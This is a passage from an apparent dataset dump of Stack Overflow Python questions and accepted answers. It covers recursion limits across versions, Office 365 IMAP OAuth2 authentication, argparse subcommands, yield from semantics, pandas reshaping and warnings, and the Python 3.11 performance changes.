consistent with some other functions: it is also consistent with np.angle(complex(np.inf, np.inf)) == 0.785398, for example.\nEdit 2: Looking at the source code of an actual atan2 implementation brought up the following code comment:\n\nnote that the non obvious cases are y and x both infinite or both zero. for more information, see Branch Cuts for Complex Elementary Functions, or Much Ado About Nothing's Sign Bit, by W. Kahan\n\nI dug up the referenced document, you can find a copy here. In Chapter 8 of this reference, called \"Complex zeros and infinities\", William Kahan (who is both mathematician and computer scientist and, according to Wikipedia, the \"Father of Floating Point\") covers the zero and infinity edge cases of complex numbers and arrives at pi/4 for feeding inf + j * inf into the arg function (arg being the function that calculates the phase angle of a complex number, just like np.angle above). You will find this result on page 17 in the linked PDF. I am not mathematician enough for being able to summarize Kahan's rationale (which is to say: I don't really understand it), but maybe someone else can.\n"
}
{
    "Id": 74012595,
    "PostTypeId": 1,
    "Title": "Why does code that in 3.10 throws a RecursionError as expected not throw in earlier versions?",
    "Body": "To start I tried this\ndef x():\n   try:\n      1/0 # just an division error to get an exception\n   except:\n      x()\n\nAnd this code behaves normally in 3.10 and I get RecursionError: maximum recursion depth exceeded as I expected but 3.8 goes into a stack overflow and doesn't handle the recursion error properly. But I did remember that there was RecursionError in older versions of Python too, so I tried\ndef x(): x()\n\nAnd this gives back RecursionError in both versions of Python.\nIt's as if (in the first snippet) the recursion error is never thrown in the except but the function called and then the error thrown at the first instruction of the function called but handled by the try-except.\nI then tried something else:\ndef x():\n   try:\n      x()\n   except:\n      x()\n\nThis is even weirder in some way, stack overflow below 3.10 but it get stuck in the loop in 3.10\nCan you explain this behavior?\nUPDATE\n@MisterMiyagi found a even stranger behavior, adding a statement in the except in  doesn't result in a stackoverflow\ndef x():\n   try:\n      1/0\n   except:\n      print(\"\")\n      x()\n\n",
    "AcceptedAnswerId": 74073476,
    "AcceptedAnswer": "The different behaviors for 3.10 and other versions seem to be because of a Python issue (python/cpython#86666), you can also see the correct error on Python 2.7.\nThe print \"fixes\" things because it makes Python check the recursion limit again, and through a path that is presumably not broken. You can see the code where it does that here, it also skips the repeated check if the object supports the Vectorcall calling protocol, so things like int keep the fatal error.\n"
}
{
    "Id": 73902642,
    "PostTypeId": 1,
    "Title": "Office 365 IMAP authentication via OAuth2 and python MSAL library",
    "Body": "I'm trying to upgrade a legacy mail bot to authenticate via Oauth2 instead of Basic authentication, as it's now deprecated two days from now.\nThe document states applications can retain their original logic, while swapping out only the authentication bit\n\nApplication developers who have built apps that send, read, or\notherwise process email using these protocols will be able to keep the\nsame protocol, but need to implement secure, Modern authentication\nexperiences for their users. This functionality is built on top of\nMicrosoft Identity platform v2.0 and supports access to Microsoft 365\nemail accounts.\n\nNote I've explicitly chosen the client credentials flow, because the documentation states\n\nThis type of grant is commonly used for server-to-server interactions\nthat must run in the background, without immediate interaction with a\nuser.\n\nSo I've got a python script that retrieves an Access Token using the MSAL python library. Now I'm trying to authenticate with the IMAP server, using that Access Token. There's some existing threads out there showing how to connect to Google, I imagine my case is pretty close to this one, except I'm connecting to a Office 365 IMAP server. Here's my script\nimport imaplib\nimport msal\nimport logging\n\napp = msal.ConfidentialClientApplication(\n    'client-id',\n    authority='https://login.microsoftonline.com/tenant-id',\n    client_credential='secret-key'\n)\n\nresult = app.acquire_token_for_client(scopes=['https://graph.microsoft.com/.default'])\n\ndef generate_auth_string(user, token):\n  return 'user=%s\\1auth=Bearer %s\\1\\1' % (user, token)\n\n# IMAP time!\nmailserver = 'outlook.office365.com'\nimapport = 993\nM = imaplib.IMAP4_SSL(mailserver,imapport)\nM.debug = 4\nM.authenticate('XOAUTH2', lambda x: generate_auth_string('user@mydomain.com', result['access_token']))\n\nprint(result)\n\nThe IMAP authentication is failing and despite setting M.debug = 4, the output isn't very helpful\n  22:56.53 > b'DBDH1 AUTHENTICATE XOAUTH2'\n  22:56.53 < b'+ '\n  22:56.53 write literal size 2048\n  22:57.84 < b'DBDH1 NO AUTHENTICATE failed.'\n  22:57.84 NO response: b'AUTHENTICATE failed.'\nTraceback (most recent call last):\n  File \"/home/ubuntu/mini-oauth.py\", line 21, in \n    M.authenticate(\"XOAUTH2\", lambda x: generate_auth_string('user@mydomain.com', result['access_token']))\n  File \"/usr/lib/python3.10/imaplib.py\", line 444, in authenticate\n    raise self.error(dat[-1].decode('utf-8', 'replace'))\nimaplib.IMAP4.error: AUTHENTICATE failed.\n\nAny idea where I might be going wrong, or how to get more robust information from the IMAP server about why the authentication is failing?\nThings I've looked at\n\nNote this answer no longer works as the suggested scopes fail to generate an Access Token.\n\nThe client credentials flow seems to mandate the https://graph.microsoft.com/.default grant. I'm not sure if that includes the scope required for the IMAP resource\nhttps://outlook.office.com/IMAP.AccessAsUser.All?\n\nVerified the code lifted from the Google thread produces the SASL XOAUTH2 string correctly, per example on the MS docs\n\n\nimport base64\n\nuser = 'test@contoso.onmicrosoft.com'\ntoken = 'EwBAAl3BAAUFFpUAo7J3Ve0bjLBWZWCclRC3EoAA'\n\nxoauth = \"user=%s\\1auth=Bearer %s\\1\\1\" % (user, token)\n\nxoauth = xoauth.encode('ascii')\nxoauth = base64.b64encode(xoauth)\nxoauth = xoauth.decode('ascii')\n\nxsanity = 'dXNlcj10ZXN0QGNvbnRvc28ub25taWNyb3NvZnQuY29tAWF1dGg9QmVhcmVyIEV3QkFBbDNCQUFVRkZwVUFvN0ozVmUwYmpMQldaV0NjbFJDM0VvQUEBAQ=='\n\nprint(xoauth == xsanity) # prints True\n\n\nThis thread seems to suggest multiple tokens need to be fetched, one for graph, then another for the IMAP connection; could that be what I'm missing?\n\n",
    "AcceptedAnswerId": 74131277,
    "AcceptedAnswer": "The imaplib.IMAP4.error: AUTHENTICATE failed Error occured because one point in the documentation is not that clear.\nWhen setting up the the Service Principal via Powershell you need to enter the App-ID and an Object-ID. Many people will think, it is the Object-ID you see on the overview page of the registered App, but its not!\nAt this point you need the Object-ID from \"Azure Active Directory -> Enterprise Applications --> Your-App --> Object-ID\"\nNew-ServicePrincipal -AppId  -ServiceId  [-Organization ]\n\nMicrosoft says:\n\nThe OBJECT_ID is the Object ID from the Overview page of the\nEnterprise Application node (Azure Portal) for the application\nregistration. It is not the Object ID from the Overview of the App\nRegistrations node. Using the incorrect Object ID will cause an\nauthentication failure.\n\nOfcourse you need to take care for the API-permissions and the other stuff, but this was for me the point.\nSo lets go trough it again, like it is explained on the documentation page.\nAuthenticate an IMAP, POP or SMTP connection using OAuth\n\nRegister the Application in your Tenant\nSetup a Client-Key for the application\nSetup the API permissions, select the APIs my organization uses tab and search for \"Office 365 Exchange Online\" -> Application permissions -> Choose IMAP and IMAP.AccessAsApp\nSetup the Service Principal and full access for your Application on the mailbox\nCheck if IMAP is activated for the mailbox\n\nThats the code I use to test it:\nimport imaplib\nimport msal\nimport pprint\n\nconf = {\n    \"authority\": \"https://login.microsoftonline.com/XXXXyourtenantIDXXXXX\",\n    \"client_id\": \"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXXX\", #AppID\n    \"scope\": ['https://outlook.office365.com/.default'],\n    \"secret\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\", #Key-Value\n    \"secret-id\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\", #Key-ID\n}\n    \ndef generate_auth_string(user, token):\n    return f\"user={user}\\x01auth=Bearer {token}\\x01\\x01\"    \n\nif __name__ == \"__main__\":\n    app = msal.ConfidentialClientApplication(conf['client_id'], authority=conf['authority'],\n                                             client_credential=conf['secret'])\n\n    result = app.acquire_token_silent(conf['scope'], account=None)\n\n    if not result:\n        print(\"No suitable token in cache.  Get new one.\")\n        result = app.acquire_token_for_client(scopes=conf['scope'])\n\n    if \"access_token\" in result:\n        print(result['token_type'])\n        pprint.pprint(result)\n    else:\n        print(result.get(\"error\"))\n        print(result.get(\"error_description\"))\n        print(result.get(\"correlation_id\"))\n        \n    imap = imaplib.IMAP4('outlook.office365.com')\n    imap.starttls()\n    imap.authenticate(\"XOAUTH2\", lambda x: generate_auth_string(\"target_mailbox@example.com\", result['access_token']).encode(\"utf-8\"))\n\nAfter setting up the Service Principal and giving the App full access on the mailbox, wait 15 - 30 minutes for the changes to take effect and test it.\n"
}
{
    "Id": 74752610,
    "PostTypeId": 1,
    "Title": "How to use argparse to create command groups like git?",
    "Body": "I'm trying to figure out how to use properly builtin argparse module to get a similar output than tools\nsuch as git where I can display a nice help with all \"root commands\" nicely grouped, ie:\n$ git --help\nusage: git [--version] [--help] [-C ] [-c =]\n           [--exec-path[=]] [--html-path] [--man-path] [--info-path]\n           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]\n           [--git-dir=] [--work-tree=] [--namespace=]\n           [--super-prefix=] [--config-env==]\n            []\n\nThese are common Git commands used in various situations:\n\nstart a working area (see also: git help tutorial)\n   clone     Clone a repository into a new directory\n   init      Create an empty Git repository or reinitialize an existing one\n\nwork on the current change (see also: git help everyday)\n   add       Add file contents to the index\n   mv        Move or rename a file, a directory, or a symlink\n   restore   Restore working tree files\n   rm        Remove files from the working tree and from the index\n\nexamine the history and state (see also: git help revisions)\n   bisect    Use binary search to find the commit that introduced a bug\n   diff      Show changes between commits, commit and working tree, etc\n   grep      Print lines matching a pattern\n   log       Show commit logs\n   show      Show various types of objects\n   status    Show the working tree status\n\ngrow, mark and tweak your common history\n   branch    List, create, or delete branches\n   commit    Record changes to the repository\n   merge     Join two or more development histories together\n   rebase    Reapply commits on top of another base tip\n   reset     Reset current HEAD to the specified state\n   switch    Switch branches\n   tag       Create, list, delete or verify a tag object signed with GPG\n\ncollaborate (see also: git help workflows)\n   fetch     Download objects and refs from another repository\n   pull      Fetch from and integrate with another repository or a local branch\n   push      Update remote refs along with associated objects\n\n'git help -a' and 'git help -g' list available subcommands and some\nconcept guides. See 'git help ' or 'git help '\nto read about a specific subcommand or concept.\nSee 'git help git' for an overview of the system.\n\nHere's my attempt:\nfrom argparse import ArgumentParser\n\n\nclass FooCommand:\n    def __init__(self, subparser):\n        self.name = \"Foo\"\n        self.help = \"Foo help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\nclass BarCommand:\n    def __init__(self, subparser):\n        self.name = \"Bar\"\n        self.help = \"Bar help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\nclass BazCommand:\n    def __init__(self, subparser):\n        self.name = \"Baz\"\n        self.help = \"Baz help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\ndef test1():\n    parser = ArgumentParser(description=\"Test1 ArgumentParser\")\n    root = parser.add_subparsers(dest=\"command\", description=\"All Commands:\")\n\n    # Group1\n    FooCommand(root)\n    BarCommand(root)\n\n    # Group2\n    BazCommand(root)\n\n    args = parser.parse_args()\n    print(args)\n\n\ndef test2():\n    parser = ArgumentParser(description=\"Test2 ArgumentParser\")\n\n    # Group1\n    cat1 = parser.add_subparsers(dest=\"command\", description=\"Category1 Commands:\")\n    FooCommand(cat1)\n    BarCommand(cat1)\n\n    # Group2\n    cat2 = parser.add_subparsers(dest=\"command\", description=\"Category2 Commands:\")\n    BazCommand(cat2)\n\n    args = parser.parse_args()\n    print(args)\n\nIf you run test1 you'd get:\n$ python mcve.py --help\nusage: mcve.py [-h] {Foo,Bar,Baz} ...\n\nTest1 ArgumentParser\n\noptions:\n  -h, --help     show this help message and exit\n\nsubcommands:\n  All Commands:\n\n  {Foo,Bar,Baz}\n    Foo          Foo help\n    Bar          Bar help\n    Baz          Baz help\n\nObviously this is not what I want, in there I just see all commands in a flat list, no groups or whatsoever... so the next logical attempt would be trying to group them. But if I run test2 I'll get:\n$ python mcve.py --help\nusage: mcve.py [-h] {Foo,Bar} ...\nmcve.py: error: cannot have multiple subparser arguments\n\nWhich obviously means I'm not using properly argparse to accomplish the task at hand. So, is it possible to use argparse to achieve a similar behaviour than git? In the past I've relied on \"hacks\" so I thought the best practice here would be using the concept of add_subparsers but it seems I didn't understand properly that concept.\n",
    "AcceptedAnswerId": 74772609,
    "AcceptedAnswer": "This isn't supported natively by argparse -- you can't nest subparsers, so if you want this sort of cli using argparse you're going to need to build a lot of logic on top of argparse. You can set nargs=argparse.REMAINDER to collect a subcommand and arguments without having them parsed by argparse, which means we can build something like this:\nimport argparse\nimport copy\n\n\nclass Command:\n    def __init__(self):\n        self.subcommands = {}\n        self.parser = argparse.ArgumentParser()\n\n    def add_subcommand(self, name, sub):\n        self.subcommands[name] = sub\n\n    def add_argument(self, *args, **kwargs):\n        return self.parser.add_argument(*args, **kwargs)\n\n    def parse_args(self, args=None):\n        if not self.subcommands:\n            args = self.parser.parse_args(args)\n            return args\n\n        p = copy.deepcopy(self.parser)\n        p.add_argument(\"subcommand\")\n        p.add_argument(\"args\", nargs=argparse.REMAINDER)\n        args = p.parse_args(args)\n\n        try:\n            sub = self.subcommands[args.subcommand]\n        except KeyError:\n            return self.parser.parse_args(args)\n\n        sub_args = sub.parse_args(args.args)\n\n        for attr in dir(sub_args):\n            if attr.startswith(\"_\"):\n                continue\n            setattr(args, attr, getattr(sub_args, attr))\n\n        return args\n\n\ndef main():\n    root = Command()\n    root.add_argument(\"-v\", \"--verbose\", action=\"count\")\n\n    cmd1 = Command()\n    cmd1_foo = Command()\n    cmd1_foo.add_argument(\"-n\", \"--name\")\n    cmd1.add_subcommand(\"foo\", cmd1_foo)\n    root.add_subcommand(\"cmd1\", cmd1)\n\n    cmd2 = Command()\n    cmd2_bar = Command()\n    cmd2_bar.add_argument(\"-s\", \"--size\", type=int)\n    cmd2.add_subcommand(\"bar\", cmd2_bar)\n    root.add_subcommand(\"cmd2\", cmd2)\n\n    print(root.parse_args())\n\n\nif __name__ == \"__main__\":\n    main()\n\nThis is horrible and ugly and poorly structured, but it means we can do this:\n$ python argtest.py --verbose cmd1 foo --name lars\nNamespace(verbose=1, subcommand='foo', args=['--name', 'lars'], name='lars')\n\nOr this:\n$ python argtest.py --verbose cmd2 bar --size 10\nNamespace(verbose=1, subcommand='bar', args=['--size', '10'], size=10)\n\n\nIf you're willing to look beyond argparse, libraries like Click and Typer make things much easier. For example, the above command could be implemented using Click like this:\nimport click\n\n@click.group()\ndef main():\n    pass\n\n@main.group()\ndef cmd1():\n    pass\n\n@cmd1.command()\n@click.option('-n', '--name')\ndef foo(name):\n    pass\n\n@main.group()\ndef cmd2():\n    pass\n\n\n@cmd2.command()\n@click.option('-s', '--size', type=int)\ndef bar():\n    pass\n\nif __name__ == '__main__':\n    main()\n\nSo much nicer!\n"
}
{
    "Id": 74922314,
    "PostTypeId": 1,
    "Title": "yield from vs yield in for-loop",
    "Body": "My understanding of yield from is that it is similar to yielding every item from an iterable. Yet, I observe the different behavior in the following example.\nI have Class1\nclass Class1:\n    def __init__(self, gen):\n        self.gen = gen\n        \n    def __iter__(self):\n        for el in self.gen:\n            yield el\n\nand Class2 that different only in replacing yield in for loop with yield from\nclass Class2:\n    def __init__(self, gen):\n        self.gen = gen\n        \n    def __iter__(self):\n        yield from self.gen\n\nThe code below reads the first element from an instance of a given class and then reads the rest in a for loop:\na = Class1((i for i in range(3)))\nprint(next(iter(a)))\nfor el in iter(a):\n    print(el)\n\nThis produces different outputs for Class1 and Class2. For Class1 the output is\n0\n1\n2\n\nand for Class2 the output is\n0\n\nLive demo\nWhat is the mechanism behind yield from that produces different behavior?\n",
    "AcceptedAnswerId": 74923483,
    "AcceptedAnswer": "What Happened?\nWhen you use next(iter(instance_of_Class2)), iter() calls .close() on the inner generator when it (the iterator, not the generator!) goes out of scope (and is deleted), while with Class1, iter() only closes its instance\n>>> g = (i for i in range(3))\n>>> b = Class2(g)\n>>> i = iter(b)     # hold iterator open\n>>> next(i)\n0\n>>> next(i)\n1\n>>> del(i)          # closes g\n>>> next(iter(b))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nThis behavior is described in PEP 342 in two parts\n\nthe new .close() method (well, new to Python 2.5)\nfrom the Specification Summary\n\n\nAdd support to ensure that close() is called when a generator iterator is garbage-collected.\n\n\n\n\nWhat happens is a little clearer (if perhaps surprising) when multiple generator delegations occur; only the generator being delegated is closed when its wrapping iter is deleted\n>>> g1 = (a for a in range(10))\n>>> g2 = (a for a in range(10, 20))\n>>> def test3():\n...     yield from g1\n...     yield from g2\n... \n>>> next(test3())\n0\n>>> next(test3())\n10\n>>> next(test3())\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\n\nFixing Class2\nWhat options are there to make Class2 behave more the way you expect?\nNotably, other strategies, though they don't have the visually pleasing sugar of yield from or some of its potential benefits gives you a way to interact with the values, which seems like a primary benefit\n\navoid creating a structure like this at all (\"just don't do that!\")\nif you don't interact with the generator and don't intend to keep a reference to the iterator, why bother wrapping it at all? (see above comment about interacting)\ncreate the iterator yourself internally (this may be what you expected)\n>>> class Class3:\n...     def __init__(self, gen):\n...         self.iterator = iter(gen)\n...         \n...     def __iter__(self):\n...         return self.iterator\n... \n>>> c = Class3((i for i in range(3)))\n>>> next(iter(c))\n0\n>>> next(iter(c))\n1\n\n\nmake the whole class a \"proper\" Generator\nwhile testing this, it plausibly highlights some iter() inconsistency - see comments below (ie. why isn't e closed?)\nalso an opportunity to pass multiple generators with itertools.chain.from_iterable\n>>> class Class5(collections.abc.Generator):\n...     def __init__(self, gen):\n...         self.gen = gen\n...     def send(self, value):\n...         return next(self.gen)\n...     def throw(self, value):\n...         raise StopIteration\n...     def close(self):          # optional, but more complete\n...         self.gen.close()\n... \n>>> e = Class5((i for i in range(10)))\n>>> next(e)        # NOTE iter is not necessary!\n0\n>>> next(e)\n1\n>>> next(iter(e))  # but still works\n2\n>>> next(iter(e))  # doesn't close e?? (should it?)\n3\n>>> e.close()\n>>> next(e)\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/lib/python3.9/_collections_abc.py\", line 330, in __next__\n    return self.send(None)\n  File \"\", line 5, in send\nStopIteration\n\n\n\n\nHunting the Mystery\nA better clue is that if you directly try again, next(iter(instance)) raises StopIteration, indicating the generator is permanently closed (either through exhaustion or .close()), and why iterating over it with a for loop yields no more values\n>>> a = Class1((i for i in range(3)))\n>>> next(iter(a))\n0\n>>> next(iter(a))\n1\n>>> b = Class2((i for i in range(3)))\n>>> next(iter(b))\n0\n>>> next(iter(b))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nHowever, if we name the iterator, it works as expected\n>>> b = Class2((i for i in range(3)))\n>>> i = iter(b)\n>>> next(i)\n0\n>>> next(i)\n1\n>>> j = iter(b)\n>>> next(j)\n2\n>>> next(i)\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nTo me, this suggests that when the iterator doesn't have a name, it calls .close() when it goes out of scope\n>>> def gen_test(iterable):\n...     yield from iterable\n... \n>>> g = gen_test((i for i in range(3)))\n>>> next(iter(g))\n0\n>>> g.close()\n>>> next(iter(g))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nDisassembling the result, we find the internals are a little different\n>>> a = Class1((i for i in range(3)))\n>>> dis.dis(a.__iter__)\n  6           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (gen)\n              4 GET_ITER\n        >>    6 FOR_ITER                10 (to 18)\n              8 STORE_FAST               1 (el)\n\n  7          10 LOAD_FAST                1 (el)\n             12 YIELD_VALUE\n             14 POP_TOP\n             16 JUMP_ABSOLUTE            6\n        >>   18 LOAD_CONST               0 (None)\n             20 RETURN_VALUE\n>>> b = Class2((i for i in range(3)))\n>>> dis.dis(b.__iter__)\n  6           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (gen)\n              4 GET_YIELD_FROM_ITER\n              6 LOAD_CONST               0 (None)\n              8 \n             10 POP_TOP\n             12 LOAD_CONST               0 (None)\n             14 RETURN_VALUE\n\nNotably, the yield from version has GET_YIELD_FROM_ITER\n\nIf TOS is a generator iterator or coroutine object it is left as is. Otherwise, implements TOS = iter(TOS).\n\n(subtly, YIELD_FROM keyword appears to be removed in 3.11)\nSo if the given iterable (to the class) is a generator iterator, it'll be handed off directly, giving the result we (might) expect\n\nExtras\nPassing an iterator which isn't a generator (iter() creates a new iterator each time in both cases)\n>>> a = Class1([i for i in range(3)])\n>>> next(iter(a))\n0\n>>> next(iter(a))\n0\n>>> b = Class2([i for i in range(3)])\n>>> next(iter(b))\n0\n>>> next(iter(b))\n0\n\nExpressly closing Class1's internal generator\n>>> g = (i for i in range(3))\n>>> a = Class1(g)\n>>> next(iter(a))\n0\n>>> next(iter(a))\n1\n>>> a.gen.close()\n>>> next(iter(a))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\ngenerator is only closed by iter when deleted if instance is popped\n>>> g = (i for i in range(10))\n>>> b = Class2(g)\n>>> i = iter(b)\n>>> next(i)\n0\n>>> j = iter(b)\n>>> del(j)        # next() not called on j\n>>> next(i)\n1\n>>> j = iter(b)\n>>> next(j)\n2\n>>> del(j)        # generator closed\n>>> next(i)       # now fails, despite range(10) above\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\n"
}
{
    "Id": 74893662,
    "PostTypeId": 1,
    "Title": "Transpose pandas DF based on value data type",
    "Body": "I have pandas DataFrame A. I am struggling transforming this into my desired format, see DataFrame B. I tried pivot or melt but I am not sure how I could make it conditional (string values to FIELD_STR_VALUE, numeric values to FIELD_NUM_VALUE). I was hoping you could point me the right direction.\nA: Input DataFrame\n|FIELD_A |FIELD_B |FIELD_C |FIELD_D |\n|--------|--------|--------|--------|\n|123123  |8       |a       |23423   |\n|123124  |7       |c       |6464    |\n|123144  |99      |x       |234     |\n\nB: Desired output DataFrame\n|ID |FIELD_A |FIELD_NAME |FIELD_STR_VALUE |FIELD_NUM_VALUE |\n|---|--------|-----------|----------------|----------------|\n|1  |123123  |B          |                |8               |\n|2  |123123  |C          |a               |                |\n|3  |123123  |D          |                |23423           |\n|4  |123124  |B          |                |7               |\n|5  |123124  |C          |c               |                |\n|6  |123124  |D          |                |6464            |\n|7  |123144  |B          |                |99              |\n|8  |123144  |C          |x               |                |\n|9  |123144  |D          |                |234             |\n\n",
    "AcceptedAnswerId": 74893842,
    "AcceptedAnswer": "You can use:\n# dic = {np.int64: 'NUM', object: 'STR'}\n\n(df.set_index('FIELD_A')\n   .pipe(lambda d: d.set_axis(pd.MultiIndex.from_arrays(\n          [d.columns, d.dtypes],\n         # or for custom NAMES\n         #[d.columns, d.dtypes.map(dic)],\n                              names=['FIELD_NAME', None]),\n                              axis=1)\n        )\n   .stack(0).add_prefix('FIELD_').add_suffix('_VALUE')\n   .reset_index()\n)\n\nNB. if you really want STR/NUM, map those strings from the dtypes (see comments in code).\nOutput:\n   FIELD_A FIELD_NAME  FIELD_int64_VALUE FIELD_object_VALUE\n0   123123    FIELD_B                8.0                NaN\n1   123123    FIELD_C                NaN                  a\n2   123123    FIELD_D            23423.0                NaN\n3   123124    FIELD_B                7.0                NaN\n4   123124    FIELD_C                NaN                  c\n5   123124    FIELD_D             6464.0                NaN\n6   123144    FIELD_B               99.0                NaN\n7   123144    FIELD_C                NaN                  x\n8   123144    FIELD_D              234.0                NaN\n\n"
}
{
    "Id": 74057367,
    "PostTypeId": 1,
    "Title": "How to get rid of the in place FutureWarning when setting an entire column from an array?",
    "Body": "In pandas v.1.5.0 a new warning has been added, which is shown, when a column is set from an array of different dtype. The FutureWarning informs about a planned semantic change, when using iloc: the change will be done in-place in future versions. The changelog instructs what to do to get the old behavior, but there is no hint how to handle the situation, when in-place operation is in fact the right choice.\nThe example from the changelog:\ndf = pd.DataFrame({'price': [11.1, 12.2]}, index=['book1', 'book2'])\noriginal_prices = df['price']\nnew_prices = np.array([98, 99])\ndf.iloc[:, 0] = new_prices\ndf.iloc[:, 0]\n\nThis is the warning, which is printed in pandas 1.5.0:\n\nFutureWarning: In a future version, df.iloc[:, i] = newvals will\nattempt to set the values inplace instead of always setting a new\narray. To retain the old behavior, use either df[df.columns[i]] = newvals or, if columns are non-unique, df.isetitem(i, newvals)\n\nHow to get rid of the warning, if I don't care about in-place or not, but want to get rid of the warning? Am I supposed to change dtype explicitly? Do I really need to catch the warning every single time I need to use this feature? Isn't there a better way?\n",
    "AcceptedAnswerId": 74193599,
    "AcceptedAnswer": "I haven't found any better way than suppressing the warning using the warnings module:\nimport numpy as np\nimport pandas as pd\nimport warnings\n\ndf = pd.DataFrame({\"price\": [11.1, 12.2]}, index=[\"book1\", \"book2\"])\noriginal_prices = df[\"price\"]\nnew_prices = np.array([98, 99])\nwith warnings.catch_warnings():\n    # Setting values in-place is fine, ignore the warning in Pandas >= 1.5.0\n    # This can be removed, if Pandas 1.5.0 does not need to be supported any longer.\n    # See also: https://stackoverflow.com/q/74057367/859591\n    warnings.filterwarnings(\n        \"ignore\",\n        category=FutureWarning,\n        message=(\n            \".*will attempt to set the values inplace instead of always setting a new array. \"\n            \"To retain the old behavior, use either.*\"\n        ),\n    )\n\n    df.iloc[:, 0] = new_prices\n\ndf.iloc[:, 0]\n\n"
}
{
    "Id": 74206978,
    "PostTypeId": 1,
    "Title": "Why does this specific code run faster in Python 3.11?",
    "Body": "I have the following code in a Python file called benchmark.py.\nsource = \"\"\"\nfor i in range(1000):\n    a = len(str(i)) \n\"\"\"\n\nimport timeit\n\nprint(timeit.timeit(stmt=source, number=100000))\n\nWhen I tried to run with multiple python versions I am seeing a drastic performance difference.\nC:\\Users\\Username\\Desktop>py -3.10 benchmark.py\n16.79652149998583\n\nC:\\Users\\Username\\Desktop>py -3.11 benchmark.py\n10.92280820000451\n\nAs you can see this code runs faster with python 3.11 than previous Python versions. I tried to disassemble the bytecode to understand the reason for this behaviour but I could only see a difference in opcode names (CALL_FUNCTION is replaced by PRECALL and CALL opcodes).\nI am quite not sure if that's the reason for this performance change. so I am looking for an answer that justifies with reference to cpython\nsource code.\npython 3.11 bytecode\n  0           0 RESUME                   0\n\n  2           2 PUSH_NULL\n              4 LOAD_NAME                0 (range)\n              6 LOAD_CONST               0 (1000)\n              8 PRECALL                  1\n             12 CALL                     1\n             22 GET_ITER\n        >>   24 FOR_ITER                22 (to 70)\n             26 STORE_NAME               1 (i)\n\n  3          28 PUSH_NULL\n             30 LOAD_NAME                2 (len)\n             32 PUSH_NULL\n             34 LOAD_NAME                3 (str)\n             36 LOAD_NAME                1 (i)\n             38 PRECALL                  1\n             42 CALL                     1\n             52 PRECALL                  1\n             56 CALL                     1\n             66 STORE_NAME               4 (a)\n             68 JUMP_BACKWARD           23 (to 24)\n\n  2     >>   70 LOAD_CONST               1 (None)\n             72 RETURN_VALUE\n\npython 3.10 bytecode\n  2           0 LOAD_NAME                0 (range)\n              2 LOAD_CONST               0 (1000)\n              4 CALL_FUNCTION            1\n              6 GET_ITER\n        >>    8 FOR_ITER                 8 (to 26)\n             10 STORE_NAME               1 (i)\n\n  3          12 LOAD_NAME                2 (len)\n             14 LOAD_NAME                3 (str)\n             16 LOAD_NAME                1 (i)\n             18 CALL_FUNCTION            1\n             20 CALL_FUNCTION            1\n             22 STORE_NAME               4 (a)\n             24 JUMP_ABSOLUTE            4 (to 8)\n\n  2     >>   26 LOAD_CONST               1 (None)\n             28 RETURN_VALUE\n\nPS: I understand that python 3.11 introduced bunch of performance improvements but I am curios to understand what optimization makes this code run faster in python 3.11\n",
    "AcceptedAnswerId": 74220032,
    "AcceptedAnswer": "There's a big section in the \"what's new\" page labeled \"faster runtime\". It looks like the most likely cause of the speedup here is PEP 659, which is a first start towards JIT optimization (perhaps not quite JIT compilation, but definitely JIT optimization).\nParticularly, the lookup and call for len and str now bypass a lot of dynamic machinery in the overwhelmingly common case where the built-ins aren't shadowed or overridden. The global and builtin dict lookups to resolve the name get skipped in a fast path, and the underlying C routines for len and str are called directly, instead of going through the general-purpose function call handling.\nYou wanted source references, so here's one. The str call will get specialized in specialize_class_call:\n    if (tp->tp_flags & Py_TPFLAGS_IMMUTABLETYPE) {\n        if (nargs == 1 && kwnames == NULL && oparg == 1) {\n            if (tp == &PyUnicode_Type) {\n                _Py_SET_OPCODE(*instr, PRECALL_NO_KW_STR_1);\n                return 0;\n            }\n\nwhere it detects that the call is a call to the str builtin with 1 positional argument and no keywords, and replaces the corresponding PRECALL opcode with PRECALL_NO_KW_STR_1. The handling for the PRECALL_NO_KW_STR_1 opcode in the bytecode evaluation loop looks like this:\n        TARGET(PRECALL_NO_KW_STR_1) {\n            assert(call_shape.kwnames == NULL);\n            assert(cframe.use_tracing == 0);\n            assert(oparg == 1);\n            DEOPT_IF(is_method(stack_pointer, 1), PRECALL);\n            PyObject *callable = PEEK(2);\n            DEOPT_IF(callable != (PyObject *)&PyUnicode_Type, PRECALL);\n            STAT_INC(PRECALL, hit);\n            SKIP_CALL();\n            PyObject *arg = TOP();\n            PyObject *res = PyObject_Str(arg);\n            Py_DECREF(arg);\n            Py_DECREF(&PyUnicode_Type);\n            STACK_SHRINK(2);\n            SET_TOP(res);\n            if (res == NULL) {\n                goto error;\n            }\n            CHECK_EVAL_BREAKER();\n            DISPATCH();\n        }\n\nwhich consists mostly of a bunch of safety prechecks and reference fiddling wrapped around a call to PyObject_Str, the C routine for calling str on an object.\nPython 3.11 includes many other performance enhancements besides the above, including optimizations to stack frame creation, method lookup, common arithmetic operations, interpreter startup, and more. Most code should run much faster now, barring things like I/O-bound workloads and code that spent most of its time in C library code (like NumPy).\n"
}
{
    "Id": 74965764,
    "PostTypeId": 1,
    "Title": "How can I properly hash dictionaries with a common set of keys, for deduplication purposes?",
